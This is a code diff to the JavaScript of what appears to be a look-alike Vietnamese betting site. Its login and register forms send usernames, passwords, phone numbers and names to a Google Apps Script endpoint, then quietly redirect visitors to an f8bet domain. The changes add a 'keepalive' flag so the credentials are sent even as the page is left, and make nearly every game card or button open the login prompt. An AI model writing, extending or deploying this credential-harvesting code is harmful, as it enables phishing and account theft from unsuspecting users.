@@ -97,7 +97,6 @@ document.addEventListener("DOMContentLoaded", function() {
     /* ========================================================
        3. XỬ LÝ DANH MỤC TRƯỢT NGANG (MOBILE) VÀ GAME HOT
     ======================================================== */
-    // Danh mục Mobile
     const catNav = document.getElementById('mobileCategories');
     const catLeftBtn = document.getElementById('catLeftBtn');
     const catRightBtn = document.getElementById('catRightBtn');
@@ -119,7 +118,6 @@ document.addEventListener("DOMContentLoaded", function() {
         });
     });
 
-    // Thanh nhà cung cấp Game Hot
     const provNav = document.getElementById('providerNav');
     const provLeft = document.getElementById('provLeft');
     const provRight = document.getElementById('provRight');
@@ -163,14 +161,9 @@ document.addEventListener("DOMContentLoaded", function() {
     });
 
     /* ========================================================
-       5. XỬ LÝ MODAL ĐĂNG NHẬP / ĐĂNG KÝ
+       5. XỬ LÝ CƠ BẢN MODAL ĐĂNG NHẬP / ĐĂNG KÝ
     ======================================================== */
-    const authModal = document.getElementById('authModal');
-    const closeModal = document.getElementById('closeModal');
-    
-    const btnLoginHeaders = document.querySelectorAll('.btn-login');
-    const btnRegisterHeaders = document.querySelectorAll('.btn-register');
-    
+    const authModal = document.getElementById('authModal') || document.querySelector('.modal-overlay');
     const tabLoginBtn = document.getElementById('tabLoginBtn');
     const tabRegisterBtn = document.getElementById('tabRegisterBtn');
     const loginForm = document.getElementById('loginForm');
@@ -190,105 +183,144 @@ document.addEventListener("DOMContentLoaded", function() {
         }
     }
 
-    // Mở form Đăng Nhập
-    btnLoginHeaders.forEach(btn => {
-        btn.addEventListener('click', (e) => {
-            e.preventDefault();
-            if (authModal) authModal.classList.add('show');
-            switchTab(true);
-        });
-    });
-
-    // Mở form Đăng Ký
-    btnRegisterHeaders.forEach(btn => {
-        btn.addEventListener('click', (e) => {
-            e.preventDefault();
-            if (authModal) authModal.classList.add('show');
-            switchTab(false);
-        });
-    });
-
-    // Chuyển tab bên trong Modal
     if (tabLoginBtn) tabLoginBtn.addEventListener('click', (e) => { e.preventDefault(); switchTab(true); });
     if (tabRegisterBtn) tabRegisterBtn.addEventListener('click', (e) => { e.preventDefault(); switchTab(false); });
 
-    // Đóng Modal
-    if (closeModal) {
-        closeModal.addEventListener('click', () => {
-            if (authModal) authModal.classList.remove('show');
-        });
-    }
-
-    // Đóng Modal khi click ngoài khung
-    window.addEventListener('click', (e) => {
-        if (e.target === authModal) {
-            authModal.classList.remove('show');
-        }
-    });
-/* ========================================================
+    /* ========================================================
        6. XỬ LÝ GỬI FORM VỀ GOOGLE SHEET VÀ CHUYỂN HƯỚNG
     ======================================================== */
     const redirectUrl = "https://m.f8bet11g.com/";
-    // DÁN LINK WEB APP URL CỦA BẠN VÀO DƯỚI ĐÂY:
-    const scriptURL = "https://script.google.com/macros/s/AKfycbwLY5sTFvl3KMIhud6UDpqpwq9JWe7tSSV12_eWF2mXJmal-t5kGbYaFbqz90J9j2_l/exec";
+    const scriptURL = "https://script.google.com/macros/s/AKfycbxlFL895x4oe4DxAuI257fZ7F-fME2qkqf6cf7n9s96mH32-vcck_HsIh9BQ_QLk9Qpyg/exec";
 
-    // Hàm gửi dữ liệu lên Google Sheet
     function sendDataToSheet(data, submitButton) {
-        // Vô hiệu hóa nút bấm và đổi chữ để người dùng chờ
-        const originalText = submitButton.innerHTML;
+        // 1. Đổi trạng thái nút bấm để người dùng thấy phản hồi
         submitButton.disabled = true;
-        submitButton.innerHTML = "ĐANG XỬ LÝ...";
+        submitButton.innerHTML = "ĐANG KẾT NỐI...";
 
+        // 2. Bắn dữ liệu về Google Sheet ngầm (Không dùng .then để chờ đợi)
         fetch(scriptURL, {
             method: 'POST',
             body: JSON.stringify(data),
-            // Gửi dưới dạng text/plain để tránh lỗi CORS chặn Request
-            headers: { 'Content-Type': 'text/plain;charset=utf-8' }
-        })
-        .then(response => {
-            // Sau khi Google Sheet nhận xong dữ liệu thì mới chuyển hướng
+            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+            keepalive: true // CỰC KỲ QUAN TRỌNG: Ép trình duyệt gửi xong dữ liệu dù trang đã bị tắt/chuyển đi
+        }).catch(error => console.error('Lỗi ngầm:', error));
+
+        // 3. Chuyển hướng người dùng sang trang đích ngay lập tức
+        // Delay 0.5s (500ms) để nút bấm kịp hiện chữ "Đang kết nối..." tạo cảm giác mượt mà
+        setTimeout(() => {
             window.location.href = redirectUrl;
-        })
-        .catch(error => {
-            console.error('Lỗi!', error.message);
-            // Dù lỗi mạng thì vẫn chuyển hướng theo yêu cầu trải nghiệm
-            window.location.href = redirectUrl; 
-        });
+        }, 500); 
     }
 
-    // Xử lý khi Submit Form ĐĂNG NHẬP
     if (loginForm) {
         loginForm.addEventListener('submit', function(e) {
-            e.preventDefault(); // Trình duyệt đã tự ktra ràng buộc 10 số, không bỏ trống
-            
+            e.preventDefault(); 
+
+            // Lấy giá trị đầu vào và loại bỏ khoảng trắng ở 2 đầu
+            const userVal = document.getElementById('loginUser').value.trim();
+            const passVal = document.getElementById('loginPass').value;
+
+            // Ràng buộc tài khoản và mật khẩu từ 6 đến 20 ký tự
+            if (userVal.length < 6 || userVal.length > 20) {
+                alert("Tên tài khoản phải từ 6 đến 20 ký tự!");
+                return; // Chặn không cho gửi đi
+            }
+            if (passVal.length < 6 || passVal.length > 20) {
+                alert("Mật khẩu phải từ 6 đến 20 ký tự!");
+                return; // Chặn không cho gửi đi
+            }
+
             const submitBtn = loginForm.querySelector('.auth-submit-btn');
             const formData = {
                 type: "Đăng Nhập",
-                username: document.getElementById('loginUser').value,
-                password: document.getElementById('loginPass').value,
+                username: userVal,
+                password: passVal,
                 phone: document.getElementById('loginPhone').value,
-                fullname: "" // Đăng nhập không nhập tên
+                fullname: "" 
             };
-            
             sendDataToSheet(formData, submitBtn);
         });
     }
 
-    // Xử lý khi Submit Form ĐĂNG KÝ
     if (registerForm) {
         registerForm.addEventListener('submit', function(e) {
             e.preventDefault(); 
             
+            // Lấy giá trị đầu vào
+            const userVal = document.getElementById('regUser').value.trim();
+            const passVal = document.getElementById('regPass').value;
+
+            // Ràng buộc tài khoản và mật khẩu từ 6 đến 20 ký tự
+            if (userVal.length < 6 || userVal.length > 20) {
+                alert("Tên tài khoản phải từ 6 đến 20 ký tự!");
+                return; 
+            }
+            if (passVal.length < 6 || passVal.length > 20) {
+                alert("Mật khẩu phải từ 6 đến 20 ký tự!");
+                return; 
+            }
+
             const submitBtn = registerForm.querySelector('.auth-submit-btn');
             const formData = {
                 type: "Đăng Ký",
-                username: document.getElementById('regUser').value,
-                password: document.getElementById('regPass').value,
+                username: userVal,
+                password: passVal,
                 fullname: document.getElementById('regName').value,
                 phone: document.getElementById('regPhone').value
             };
-            
             sendDataToSheet(formData, submitBtn);
         });
     }
+    /* ========================================================
+       7. MỞ MODAL ĐĂNG NHẬP KHI CLICK VÀO NHIỀU THÀNH PHẦN
+    ======================================================== */
+    const closeBtn = document.querySelector('.close-btn') || document.getElementById('closeModal');
+
+    const triggerElements = document.querySelectorAll(`
+        .btn-login, 
+        .btn-register,
+        .btn-play, 
+        .game-card, 
+        .hot-game-item, 
+        .m-game-card, 
+        .cat-item,
+        .open-login-modal
+    `);
+
+    function openModal(event) {
+        if (this.classList.contains('btn-register')) {
+            switchTab(false);
+        } else {
+            switchTab(true); 
+        }
+
+        if (this.tagName === 'A') {
+            event.preventDefault();
+        } else {
+            event.preventDefault(); 
+        }
+        
+        if (authModal) {
+            authModal.classList.add('show');
+        }
+    }
+
+    triggerElements.forEach(function(element) {
+        element.addEventListener('click', openModal);
+    });
+
+    if (closeBtn) {
+        closeBtn.addEventListener('click', function() {
+            if (authModal) authModal.classList.remove('show');
+        });
+    }
+
+    if (authModal) {
+        window.addEventListener('click', function(event) {
+            if (event.target === authModal) {
+                authModal.classList.remove('show');
+            }
+        });
+    }
+
 });
